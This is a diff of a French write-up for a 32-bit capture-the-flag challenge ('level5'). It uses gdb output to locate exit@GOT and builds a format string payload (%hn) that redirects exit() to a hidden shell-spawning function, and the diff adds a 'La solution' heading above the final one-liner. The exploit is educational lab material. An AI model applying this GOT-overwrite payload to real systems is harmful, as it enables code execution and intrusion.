@@ -5,7 +5,7 @@ Dans le programme se trouve une fonction o() qui execute un shell mais qui n'est
 
 ## La faille
 
-On a essayé de passer par un simple bufferoverlow mais ce n'est pas possible à cause de `fgets`.
+Une première idée aurait été de passer par un simple bufferoverlow mais ce n'est pas possible à cause de `fgets`.
 
 La prochaine idée serait de remplacer l'adresse de la fonction  exit() par l'adresse de o().
 
@@ -34,18 +34,7 @@ All functions matching regular expression "exit":
 Non-debugging symbols:
 0x08048390  _exit
 0x08048390  _exit@plt
-0x080483d0  exit
-0x080483d0  exit@plt
-0xb7e5ebe0  exit
-0xb7e5ec10  on_exit
-0xb7e5ee20  __cxa_atexit
-0xb7e5efc0  quick_exit
-0xb7e5eff0  __cxa_at_quick_exit
-0xb7ee41d8  _exit
-0xb7f28500  pthread_exit
-0xb7f2dc10  __cyg_profile_func_exit
-0xb7f4c750  svc_exit
-0xb7f56c80  atexit
+
 (gdb) disass 0x08048390
 Dump of assembler code for function _exit@plt:
    0x08048390 <+0>:	jmp    *0x08049838
@@ -55,7 +44,7 @@ End of assembler dump.
 (gdb) 
 
 
-Maintenant on a l'adresse vers laquelle exit jmp, il suffit de la remplacer par l'adresse de o()
+Maintenant on a l'adresse vers laquelle exit jump, il suffit de la remplacer par l'adresse de o()
 la vraie adresse d'exit: 0x08049838
 
 Comme les deux premiers octets (0x0804) sont identiques à l'adresse GOT on peut écrire seuelement les deux derniers
@@ -75,6 +64,8 @@ caractères imprimés = 4 (adresse GOT) + 33952 (padding) = 33956
 
 %n écrit le nombre total de caractères imprimés et on rajoute le h à %n (%hn) pour réécrire les deux derniers octets de l'adresse
 
+
+## La solution
 (python -c 'print "\x08\x04\x98\x38"[::-1] + "%33952c%4$hn"'; cat) | ./level5
 
 La commande met l’adresse de `exit@GOT` au début du buffer en little-endian (car le système est 32 bits) et ajoute un padding pour que le nombre total de caractères imprimés atteigne la valeur des 2 derniers octets de l’adresse de `o()`. Ensuite, `%4$hn` écrit ce nombre dans l’adresse fournie (le 4ᵉ argument du printf, notre buffer), **modifiant seulement les 2 derniers octets** pour que `exit()` pointe vers `o()`.
